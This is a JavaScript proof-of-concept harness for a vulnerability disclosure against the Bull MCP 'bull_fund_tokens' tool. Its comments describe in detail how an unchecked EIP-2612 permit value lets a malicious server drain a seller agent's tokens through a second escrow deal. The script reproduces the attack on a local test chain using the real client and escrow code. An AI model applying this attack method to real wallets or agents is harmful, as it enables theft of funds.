// PoC B-10: Bull MCP `bull_fund_tokens` permit path — permit value is never
// checked against the agreed sellAmount; victim loses 999,900 tokens.
//
// Setup: victim (seller, MCP agent wallet) holds 1,000,000 Mock Permit Tokens
// and agreed to sell 100 of them for 0.1 ETH (deal #1, legit buyer already
// paid 0.1 ETH into escrow). The victim's agent calls bull_fund_tokens({quoteId}).
// The REAL local MCP (bull-mcp.mjs, verbatim) receives a deposit plan whose
// EIP-2612 permit has value = 1,000,000 tokens. Its only checks — owner==me,
// spender is a Bull escrow, value < 2**200, deadline within 24h — all pass,
// so it SIGNS the permit and hands v/r/s to the server (bull_deposit).
// The malicious server/relayer then (0) submits the permit DIRECTLY to the
// token (EIP-2612 permit() is permissionless — anyone can submit it), setting
// allowance[victim][escrow] = 1,000,000 — this step is REQUIRED, because
// BullEscrow.fundTokensWithPermit calls permit(..., d.sellAmount, ...), so a
// permit signed for 1,000,000 can never execute through the escrow for the
// 100-token deal (verified: the first PoC attempt died there, TransferFailed);
// (1) settles deal #1 with fundTokensWithPermit (100 tokens, as agreed —
// 999,900 allowance remains); and (2) creates its own deal #2 (seller=victim,
// 999,900 tokens for 0.001 ETH, buyer=attacker), funds it, and settles it with
// fundTokensWithPermit using the SAME permit signature: the inner permit()
// fails (value + nonce mismatch) but BullEscrow swallows that in try/catch,
// and _pull takes the 999,900 tokens from the victim on the leftover allowance.
//
// Harness: fresh local Anvil (port 8551, chain 31337) + REAL BullEscrow source
// (verbatim, etched at its production address — the MCP hardcodes the escrow
// allowlist) + MockERC20Permit (minimal EIP-2612) + mock Bull API/remote-MCP
// (mock-mcp.mjs) + the REAL MCP driven over stdio JSON-RPC. No real Bull
// infrastructure, no real funds, no mainnet.
//
//   1. Start Anvil:  anvil --port 8551 --chain-id 31337
//   2. From this directory:  node run-poc.mjs
//
// Expected output: EXPLOITED.
import { readFileSync, writeFileSync } from "node:fs";
import { spawn } from "node:child_process";
import { createHash } from "node:crypto";
import {
  createPublicClient, createWalletClient, defineChain, http, parseAbi,
  formatUnits, formatEther, parseEther, parseUnits, encodeAbiParameters,
  encodeFunctionData, keccak256,
} from "viem";
import { privateKeyToAccount, generatePrivateKey } from "viem/accounts";
import { startMockBull } from "./mock-mcp.mjs";

const ANVIL_RPC = "http://127.0.0.1:8551";
const MOCK_PORT = 8792;
const ZERO = "0x0000000000000000000000000000000000000000";

const anvil = defineChain({
  id: 31337, name: "anvil",
  nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
  rpcUrls: { default: { http: [ANVIL_RPC] } },
});

const tokenAbi = parseAbi([
  "function mint(address to, uint256 amount)",
  "function balanceOf(address) view returns (uint256)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function nonces(address) view returns (uint256)",
]);
const escrowAbi = parseAbi([
  "function createDeal((address seller,address sellerPayout,address buyerReceive,address sellToken,uint256 sellAmount,address payToken,uint256 payAmount,uint64 deadline) p, (uint16 feeBps,uint64 expiry,bytes sig) q) returns (uint256 id)",
  "function fundPayment(uint256 id) payable",
  "function nextId() view returns (uint256)",
  "function deals(uint256 id) view returns (address buyer, address seller, address sellToken, uint256 sellAmount, address payToken, uint256 payAmount, uint64 deadline, bool buyerFunded, bool sellerFunded, uint8 status, address sellerPayout, address buyerReceive, uint16 feeBps)",
]);
const DEAL_PARAMS_TYPE = {
  type: "tuple",
  components: [
    { name: "seller", type: "address" },
    { name: "sellerPayout", type: "address" },
    { name: "buyerReceive", type: "address" },
    { name: "sellToken", type: "address" },
    { name: "sellAmount", type: "uint256" },
    { name: "payToken", type: "address" },
    { name: "payAmount", type: "uint256" },
    { name: "deadline", type: "uint64" },
  ],
};

function loadArtifact(file, name) {
  const j = JSON.parse(readFileSync(`./chain/out/${file}/${name}.json`, "utf8"));
  return { abi: j.abi, bytecode: j.bytecode.object };
}

const log = (...a) => console.log(...a);

function callMcp(env, toolArgs) {
  return new Promise((resolve, reject) => {
    const child = spawn("node", ["bull-mcp.mjs"], { env: { ...process.env, ...env }, stdio: ["pipe", "pipe", "pipe"] });
    let buf = "";
    let settled = false;
    const done = (v) => { if (!settled) { settled = true; try { child.kill(); } catch {} resolve(v); } };
    child.stderr.on("data", (d) => process.stderr.write("[mcp-stderr] " + d));
    child.stdout.on("data", (d) => {
      buf += d.toString();
      let i;
      while ((i = buf.indexOf("\n")) >= 0) {
        const line = buf.slice(0, i).trim(); buf = buf.slice(i + 1);
        if (!line) continue;
        let m; try { m = JSON.parse(line); } catch { continue; }
        if (m.id === 2) done(m);
        if (m.error) done(m);
      }
    });
    child.on("error", reject);
    setTimeout(() => done({ error: "timeout waiting for MCP tools/call response" }), 90000);
    child.stdin.write(JSON.stringify({ jsonrpc: "2.0", id: 1, method: "initialize", params: { protocolVersion: "2025-06-18", capabilities: {}, clientInfo: { name: "poc", version: "1" } } }) + "\n");
    setTimeout(() => {
      child.stdin.write(JSON.stringify({ jsonrpc: "2.0", id: 2, method: "tools/call", params: { name: "bull_fund_tokens", arguments: toolArgs } }) + "\n");
    }, 500);
  });
}

async function main() {
  const victimKey = generatePrivateKey();
  const victim = privateKeyToAccount(victimKey);
  const buyer = privateKeyToAccount(generatePrivateKey());
  const attackerKey = generatePrivateKey();
  const attacker = privateKeyToAccount(attackerKey);
  const feeSignerKey = generatePrivateKey();
  const feeSigner = privateKeyToAccount(feeSignerKey);
  const pub = createPublicClient({ chain: anvil, transport: http() });
  const victimWallet = createWalletClient({ account: victim, chain: anvil, transport: http() });
  const buyerWallet = createWalletClient({ account: buyer, chain: anvil, transport: http() });
  const attackerWallet = createWalletClient({ account: attacker, chain: anvil, transport: http() });
  for (const a of [victim, buyer, attacker]) {
    await pub.request({ method: "anvil_setBalance", params: [a.address, "0x21e19e0c9bab2400000"] });
  }

  const tokenArt = loadArtifact("Mocks.sol", "MockERC20Permit");
  const escrowArt = loadArtifact("BullEscrow.sol", "BullEscrow");
  const tokenHash = await victimWallet.deployContract({ abi: tokenArt.abi, bytecode: tokenArt.bytecode, args: [] });
  const token = (await pub.waitForTransactionReceipt({ hash: tokenHash })).contractAddress;
  const escrowHash = await victimWallet.deployContract({
    abi: escrowArt.abi, bytecode: escrowArt.bytecode,
    args: [attacker.address, feeSigner.address],
  });
  const deployedEscrow = (await pub.waitForTransactionReceipt({ hash: escrowHash })).contractAddress;
  const PROD_ESCROW = "0xd685d39E7a3deF19E52B9AB09679b7452C23e20b";
  const deployedCode = await pub.getCode({ address: deployedEscrow });
  await pub.request({ method: "anvil_setCode", params: [PROD_ESCROW, deployedCode] });
  const one = "0x0000000000000000000000000000000000000000000000000000000000000001";
  await pub.request({ method: "anvil_setStorageAt", params: [PROD_ESCROW, "0x0000000000000000000000000000000000000000000000000000000000000000", one] });
  await pub.request({ method: "anvil_setStorageAt", params: [PROD_ESCROW, "0x0000000000000000000000000000000000000000000000000000000000000002", one] });
  const escrow = PROD_ESCROW;
  log("token (MockERC20Permit):", token);
  log("escrow (real BullEscrow, etched at prod address):", escrow);
  log("victim (seller, MCP agent wallet):", victim.address);
  log("buyer (legit):", buyer.address);
  log("attacker:", attacker.address);

  await victimWallet.writeContract({ address: token, abi: tokenAbi, functionName: "mint", args: [victim.address, parseUnits("1000000", 18)] });

  // Honest deal #1 (created before the server turned malicious, or via the
  // legit flow): victim sells 100 tokens for 0.1 ETH to the legit buyer.
  const now = Math.floor(Date.now() / 1000);
  const params1 = {
    seller: victim.address, sellerPayout: victim.address, buyerReceive: buyer.address,
    sellToken: token, sellAmount: parseUnits("100", 18),
    payToken: ZERO, payAmount: parseEther("0.1"),
    deadline: BigInt(now + 24 * 3600),
  };
  const feeBps = 250, expiry = BigInt(now + 3600);
  const ph = keccak256(encodeAbiParameters([DEAL_PARAMS_TYPE], [params1]));
  const h = keccak256(encodeAbiParameters(
    [{ type: "uint256" }, { type: "address" }, { type: "address" }, { type: "bytes32" }, { type: "uint16" }, { type: "uint64" }],
    [31337n, escrow, buyer.address, ph, feeBps, expiry],
  ));
  const sig = await feeSigner.signMessage({ message: { raw: h } });
  const deal1Id = await pub.readContract({ address: escrow, abi: escrowAbi, functionName: "nextId" });
  const createHash1 = await buyerWallet.writeContract({
    address: escrow, abi: escrowAbi, functionName: "createDeal", args: [params1, { feeBps, expiry, sig }],
  });
  await pub.waitForTransactionReceipt({ hash: createHash1 });
  await buyerWallet.writeContract({ address: escrow, abi: escrowAbi, functionName: "fundPayment", args: [deal1Id], value: parseEther("0.1") });
  log("legit deal #" + deal1Id.toString() + " created + buyer paid 0.1 ETH (sellAmount 100 tokens)");

  const { server, evidence } = await startMockBull({
    port: MOCK_PORT, anvilRpc: ANVIL_RPC, escrow, token, feeSignerKey,
    attackerKey, attacker: attacker.address, victim: victim.address, deal1Id: deal1Id.toString(),
  });
  log("mock Bull API + remote MCP listening on 127.0.0.1:" + MOCK_PORT);

  const victimTokensBefore = await pub.readContract({ address: token, abi: tokenAbi, functionName: "balanceOf", args: [victim.address] });
  log("victim tokens before:", formatUnits(victimTokensBefore, 18));
  log("agent calls bull_fund_tokens({ quoteId: 'q1' }) — expecting: deposit the agreed 100 tokens (gasless permit)");
  const resp = await callMcp(
    { BULL_AGENT_KEY: victimKey, BULL_URL: `http://127.0.0.1:${MOCK_PORT}`, BULL_RPC: ANVIL_RPC },
    { quoteId: "q1" },
  );
  if (resp.error) { log("MCP call failed:", JSON.stringify(resp.error)); process.exit(2); }
  const mcpText = resp.result?.content?.[0]?.text || "";
  log("MCP tools/call result:", mcpText);

  const victimTokens = await pub.readContract({ address: token, abi: tokenAbi, functionName: "balanceOf", args: [victim.address] });
  const attackerTokens = await pub.readContract({ address: token, abi: tokenAbi, functionName: "balanceOf", args: [attacker.address] });
  const buyerTokens = await pub.readContract({ address: token, abi: tokenAbi, functionName: "balanceOf", args: [buyer.address] });
  const allowanceLeft = await pub.readContract({ address: token, abi: tokenAbi, functionName: "allowance", args: [victim.address, escrow] });
  const deal2 = await pub.readContract({ address: escrow, abi: escrowAbi, functionName: "deals", args: [deal1Id + 1n] });
  log("victim tokens after:", formatUnits(victimTokens, 18), "(agreed sale was 100)");
  log("attacker tokens after:", formatUnits(attackerTokens, 18));
  log("buyer tokens after:", formatUnits(buyerTokens, 18), "(legit deal #1: 100)");
  log("escrow allowance left from victim:", formatUnits(allowanceLeft, 18));
  log("deal #2 on-chain: seller==victim?", deal2[1].toLowerCase() === victim.address.toLowerCase(), "| sellAmount:", formatUnits(deal2[3], 18), "| status (2=Settled):", deal2[9], "| buyerReceive==attacker?", deal2[11].toLowerCase() === attacker.address.toLowerCase());

  const unrelatedHash = createHash("sha256").update('{"tampered":true}').digest("hex");
  const result = {
    poc: "Bull MCP bull_fund_tokens permit path — permit value 1,000,000 never checked vs agreed sellAmount 100; leftover allowance drained via attacker deal #2",
    mcp: "bull-mcp.mjs (verbatim copy of https://www.bull.family/mcp/bull-mcp.mjs, sha256 29110f7c…75b18)",
    escrow: "BullEscrow.sol (verbatim source, verified on Sourcify chain 4663)",
    token: "MockERC20Permit (minimal EIP-2612, in chain/src/Mocks.sol)",
    agreedSellAmount: "100",
    permitValueSigned: "1000000",
    deal1Id: String(deal1Id),
    deal2SellAmount: formatUnits(deal2[3], 18),
    deal2StatusSettled: deal2[9] === 2,
    victimTokenBalanceBefore: formatUnits(victimTokensBefore, 18),
    victimTokenBalanceAfter: formatUnits(victimTokens, 18),
    attackerTokenBalanceAfter: formatUnits(attackerTokens, 18),
    buyerTokenBalanceAfter: formatUnits(buyerTokens, 18),
    k26_signedBodyHashIsUnrelatedString: evidence.signedBodyHashes.length > 0 && evidence.signedBodyHashes.every((x) => x === unrelatedHash),
    exploited: victimTokens === 0n && attackerTokens === parseUnits("999900", 18) && buyerTokens === parseUnits("100", 18),
  };
  writeFileSync("./poc-result.json", JSON.stringify(result, null, 2));
  log("\n=== RESULT ===");
  log(result.exploited ? "EXPLOITED: victim sold the agreed 100 tokens but lost the other 999,900 to the attacker via the inflated permit." : "NOT EXPLOITED — see poc-result.json");
  log("poc-result.json written.");
  server.close();
  process.exit(result.exploited ? 0 : 1);
}

main().catch((e) => { console.error("PoC crashed:", e); process.exit(3); });
